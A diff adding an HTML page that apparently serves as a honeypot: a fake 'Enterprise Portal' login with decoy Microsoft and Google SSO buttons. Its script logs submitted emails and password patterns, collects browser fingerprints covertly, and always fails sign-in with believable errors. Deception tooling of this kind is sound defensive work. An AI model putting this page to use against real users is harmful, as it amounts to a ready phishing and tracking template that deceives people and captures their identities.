@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Portal</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🏢</text></svg>">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            padding: 48px;
+            width: 100%;
+            max-width: 400px;
+            margin: 20px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .company-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .company-logo {
+            width: 64px;
+            height: 64px;
+            margin: 0 auto 16px;
+            background: #2563eb;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .company-logo::before {
+            content: '';
+            position: absolute;
+            width: 24px;
+            height: 24px;
+            background: white;
+            border-radius: 3px;
+            transform: rotate(45deg);
+        }
+
+        .company-logo::after {
+            content: '';
+            position: absolute;
+            width: 16px;
+            height: 16px;
+            background: #2563eb;
+            border-radius: 2px;
+            z-index: 1;
+        }
+
+        .company-name {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1e293b;
+            margin-bottom: 4px;
+        }
+
+        .company-tagline {
+            font-size: 14px;
+            color: #64748b;
+            font-weight: 400;
+        }
+
+        .login-form h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0f172a;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .login-form .subtitle {
+            color: #64748b;
+            text-align: center;
+            margin-bottom: 32px;
+            font-size: 15px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            background-color: #ffffff;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #2563eb;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #9ca3af;
+        }
+
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            accent-color: #2563eb;
+        }
+
+        .checkbox-wrapper label {
+            font-size: 14px;
+            color: #6b7280;
+            cursor: pointer;
+            margin-bottom: 0;
+        }
+
+        .forgot-link {
+            color: #2563eb;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            color: #1d4ed8;
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: #2563eb;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .login-btn:hover:not(:disabled) {
+            background: #1d4ed8;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            margin: 28px 0;
+            text-align: center;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #e5e7eb;
+        }
+
+        .divider span {
+            background: white;
+            padding: 0 16px;
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        .sso-options {
+            display: grid;
+            gap: 12px;
+        }
+
+        .sso-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            background: white;
+            color: #374151;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+
+        .sso-btn:hover {
+            background: #f9fafb;
+            border-color: #9ca3af;
+        }
+
+        .sso-btn svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+        }
+
+        .help-section {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid #e5e7eb;
+            text-align: center;
+        }
+
+        .help-section p {
+            color: #6b7280;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .help-section a {
+            color: #2563eb;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .help-section a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            background-color: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 16px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .success-message {
+            background-color: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            color: #166534;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 16px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+        }
+
+        .loading-spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e5e7eb;
+            border-top: 3px solid #2563eb;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #6b7280;
+            font-size: 13px;
+        }
+
+        .footer-links {
+            margin-top: 12px;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #6b7280;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            color: #374151;
+            text-decoration: underline;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 16px;
+            color: #059669;
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+            margin-right: 6px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .login-container {
+                margin: 10px;
+                padding: 32px 24px;
+            }
+            
+            .form-options {
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="company-header">
+            <div class="company-logo"></div>
+            <div class="company-name">Entreprise Portal</div>
+            <div class="company-tagline">Enterprise Solutions</div>
+        </div>
+        
+        <form class="login-form" id="loginForm">
+            <h1>Welcome back</h1>
+            <p class="subtitle">Sign in to your account to continue</p>
+            
+            <div class="form-group">
+                <label for="email">Email address</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="email" 
+                    placeholder="Enter your email"
+                    autocomplete="username"
+                    required
+                >
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    placeholder="Enter your password"
+                    autocomplete="current-password"
+                    required
+                >
+            </div>
+            
+            <div class="form-options">
+                <div class="checkbox-wrapper">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Remember me</label>
+                </div>
+                <a href="#" class="forgot-link" id="forgotPassword">Forgot password?</a>
+            </div>
+            
+            <button type="submit" class="login-btn" id="loginBtn">Sign in</button>
+            
+            <div class="divider">
+                <span>or</span>
+            </div>
+            
+            <div class="sso-options">
+                <a href="#" class="sso-btn" id="microsoftSSO">
+                    <svg viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M11.4 24H0V12.6h11.4V24zM24 24H12.6V12.6H24V24zM11.4 11.4H0V0h11.4v11.4zM24 11.4H12.6V0H24v11.4z" fill="#00a1f1"/>
+                    </svg>
+                    Continue with Microsoft
+                </a>
+                <a href="#" class="sso-btn" id="googleSSO">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                        <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                        <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                        <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                    </svg>
+                    Continue with Google
+                </a>
+            </div>
+            
+            <div class="help-section">
+                <p>Need help accessing your account?</p>
+                <a href="mailto:support@entra.com">Contact IT Support</a>
+                <div class="security-badge">
+                    <svg fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
+                    </svg>
+                    Secured by enterprise-grade encryption
+                </div>
+            </div>
+        </form>
+        
+        <div id="errorMessage" class="error-message"></div>
+        <div id="successMessage" class="success-message"></div>
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <p>&copy; 2024 TechCorp Enterprise Solutions. All rights reserved.</p>
+        <div class="footer-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Security</a>
+            <a href="#">Support</a>
+        </div>
+    </footer>
+
+    <script>
+        // Professional deception tracking system
+        class AuthenticationLogger {
+            constructor() {
+                this.attemptCount = 0;
+                this.maxAttempts = 5;
+                this.sessionId = this.generateSessionId();
+                this.startTime = Date.now();
+            }
+
+            generateSessionId() {
+                return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            }
+
+            async logAttempt(data) {
+                this.attemptCount++;
+                
+                const logData = {
+                    sessionId: this.sessionId,
+                    attempt: this.attemptCount,
+                    timestamp: new Date().toISOString(),
+                    email: data.email,
+                    passwordLength: data.password?.length || 0,
+                    passwordPattern: this.analyzePassword(data.password),
+                    rememberMe: data.rememberMe,
+                    userAgent: navigator.userAgent,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    onlineStatus: navigator.onLine,
+                    referrer: document.referrer,
+                    sessionDuration: Date.now() - this.startTime,
+                    ipFingerprint: await this.getIPFingerprint(),
+                    browserFingerprint: this.getBrowserFingerprint()
+                };
+
+                // Log to console for demo (in real implementation, send to backend)
+                console.log('🕵️ HONEYPOT: Authentication attempt captured', logData);
+                
+                // Simulate backend logging
+                try {
+                    await this.sendToBackend('/api/auth/log', logData);
+                } catch (error) {
+                    console.error('Backend logging failed:', error);
+                }
+
+                return logData;
+            }
+
+            analyzePassword(password) {
+                if (!password) return 'empty';
+                
+                const patterns = {
+                    hasNumbers: /\d/.test(password),
+                    hasLowercase: /[a-z]/.test(password),
+                    hasUppercase: /[A-Z]/.test(password),
+                    hasSpecialChars: /[!@#$%^&*(),.?":{}|<>]/.test(password),
+                    commonPatterns: {
+                        sequential: /123|abc|qwe/i.test(password),
+                        repeated: /(.)\1{2,}/.test(password),
+                        keyboard: /qwerty|asdf|zxcv/i.test(password)
+                    }
+                };
+                
+                return patterns;
+            }
+
+            async getIPFingerprint() {
+                // In a real implementation, you might use a service to get IP info
+                return 'simulated_ip_fingerprint';
+            }
+
+            getBrowserFingerprint() {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Browser fingerprint', 2, 2);
+                
+                return {
+                    canvasFingerprint: canvas.toDataURL(),
+                    plugins: Array.from(navigator.plugins).map(p => p.name),
+                    webgl: this.getWebGLFingerprint(),
+                    fonts: this.getFontList()
+                };
+            }
+
+            getWebGLFingerprint() {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                
+                return {
+                    vendor: gl.getParameter(gl.VENDOR),
+                    renderer: gl.getParameter(gl.RENDERER)
+                };
+            }
+
+            getFontList() {
+                // Simplified font detection
+                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Helvetica', 'Georgia'];
+                return fonts.filter(font => this.isFontAvailable(font));
+            }
+
+            isFontAvailable(font) {
+                const testString = 'mmmmmmmmmmlli';
+                const testSize = '72px';
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                
+                context.font = testSize + ' monospace';
+                const baselineSize = context.measureText(testString).width;
+                
+                context.font = testSize + ' ' + font + ', monospace';
+                const testSize2 = context.measureText(testString).width;
+                
+                return testSize2 !== baselineSize;
+            }
+
+            async sendToBackend(endpoint, data) {
+                // Simulate network delay
+                await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
+                
+                // In a real implementation, this would be your actual backend endpoint
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Session-ID': this.sessionId
+                    },
+                    body: JSON.stringify(data)
+                }).catch(() => {
+                    // Silent fail - don't reveal this is a honeypot
+                    return { ok: false };
+                });
+                
+                return response;
+            }
+        }
+
+        // Initialize the authentication logger
+        const authLogger = new AuthenticationLogger();
+
+        // Professional error messages that don't reveal this is a honeypot
+        const professionalErrors = [
+            "The email or password you entered is incorrect. Please try again.",
+            "Authentication failed. Please verify your credentials and try again.",
+            "Unable to sign in. Please check your email and password.",
+            "Login unsuccessful. Your account may be temporarily locked for security.",
+            "Access denied. Please contact your administrator if this problem persists.",
+            "Authentication server is currently unavailable. Please try again shortly.",
+            "Your session has expired. Please clear your browser cache and try again."
+        ];
+
+        // DOM elements
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const successMessage = document.getElementById('successMessage');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const forgotPasswordLink = document.getElementById('forgotPassword');
+        const microsoftSSO = document.getElementById('microsoftSSO');
+        const googleSSO = document.getElementById('googleSSO');
+
+        // Main form submission handler
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = {
+                email: emailInput.value.trim(),
+                password: passwordInput.value,
+                rememberMe: document.getElementById('remember').checked
+            };
+
+            // Show loading state
+            showLoading(true);
+            hideMessages();
+
+            try {
+                // Log the attempt (this is the core deception value)
+                await authLogger.logAttempt(formData);
+                
+                // Realistic authentication delay (2-4 seconds)
+                const delay = Math.random() * 2000 + 2000;
+                await new Promise(resolve => setTimeout(resolve, delay));
+                
+                // Always fail authentication but make it look realistic
+                await handleAuthenticationFailure();
+                
+            } catch (error) {
+                showError("Network error occurred. Please check your connection and try again.");
+            } finally {
+                showLoading(false);
+            }
+        });
+
+        // Handle authentication failure with realistic behavior
+        async function handleAuthenticationFailure() {
+            const randomError = professionalErrors[Math.floor(Math.random() * professionalErrors.length)];
+            
+            // Show account lockout warning after multiple attempts
+            if (authLogger.attemptCount >= 3) {
+                showError(`${randomError} (Attempt ${authLogger.attemptCount} of ${authLogger.maxAttempts})`);
+            } else {
+                showError(randomError);
+            }
+            
+            // Simulate account lockout
+            if (authLogger.attemptCount >= authLogger.maxAttempts) {
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'Account Locked';
+                loginBtn.style.background = '#dc2626';
+                showError("Account temporarily locked due to multiple failed attempts. Please contact IT support.");
+            }
+            
+            // Clear password field for security appearance
+            passwordInput.value = '';
+            passwordInput.focus();
+        }
+
+        // SSO button handlers (also capture attempts)
+        microsoftSSO.addEventListener('click', async (e) => {
+            e.preventDefault();
+            await logSSOAttempt('microsoft');
+            showError("Microsoft SSO is temporarily unavailable. Please use your email and password.");
+        });
+
+        googleSSO.addEventListener('click', async (e) => {
+            e.preventDefault();
+            await logSSOAttempt('google');
+            showError("Google SSO is not configured for your organization. Please use your corporate credentials.");
+        });
+
+        // Forgot password handler
+        forgotPasswordLink.addEventListener('click', async (e) => {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            
+            await authLogger.sendToBackend('/api/auth/forgot-password', {
+                email: email,
+                timestamp: new Date().toISOString(),
+                sessionId: authLogger.sessionId
+            });
+            
+            if (email) {
+                showSuccess(`Password reset instructions have been sent to ${email} if this account exists.`);
+            } else {
+                showError("Please enter your email address first.");
+                emailInput.focus();
+            }
+        });
+
+        // Log SSO attempts
+        async function logSSOAttempt(provider) {
+            await authLogger.sendToBackend('/api/auth/sso-attempt', {
+                provider: provider,
+                timestamp: new Date().toISOString(),
+                sessionId: authLogger.sessionId,
+                userAgent: navigator.userAgent,
+                referrer: document.referrer
+            });
+        }
+
+        // UI helper functions
+        function showLoading(show) {
+            if (show) {
+                loadingOverlay.style.display = 'flex';
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'Signing in...';
+            } else {
+                loadingOverlay.style.display = 'none';
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Sign in';
+            }
+        }
+
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+            successMessage.style.display = 'none';
+        }
+
+        function showSuccess(message) {
+            successMessage.textContent = message;
+            successMessage.style.display = 'block';
+            errorMessage.style.display = 'none';
+        }
+
+        function hideMessages() {
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+        }
+
+        // Professional behavior enhancements
+        window.addEventListener('load', () => {
+            emailInput.focus();
+        });
+
+        // Email domain validation (looks professional)
+        emailInput.addEventListener('blur', (e) => {
+            const email = e.target.value.trim();
+            if (email && !email.includes('@')) {
+                showError('Please enter a valid email address.');
+            } else if (email && !email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+                showError('Please enter a valid email address format.');
+            } else {
+                hideMessages();
+            }
+        });
+
+        // Caps Lock detection
+        document.addEventListener('keydown', (e) => {
+            if (e.getModifierState && e.getModifierState('CapsLock')) {
+                if (document.activeElement === passwordInput) {
+                    showError('Caps Lock is on. Passwords are case-sensitive.');
+                }
+            }
+        });
+
+        // Track page visibility (detect if user switches tabs)
+        document.addEventListener('visibilitychange', () => {
+            authLogger.sendToBackend('/api/analytics/visibility', {
+                hidden: document.hidden,
+                timestamp: new Date().toISOString(),
+                sessionId: authLogger.sessionId
+            }).catch(() => {});
+        });
+
+        // Log when user leaves the page
+        window.addEventListener('beforeunload', () => {
+            authLogger.sendToBackend('/api/analytics/session-end', {
+                sessionDuration: Date.now() - authLogger.startTime,
+                attemptCount: authLogger.attemptCount,
+                timestamp: new Date().toISOString(),
+                sessionId: authLogger.sessionId
+            }).catch(() => {});
+        });
+    </script>
+</body>
+</html>
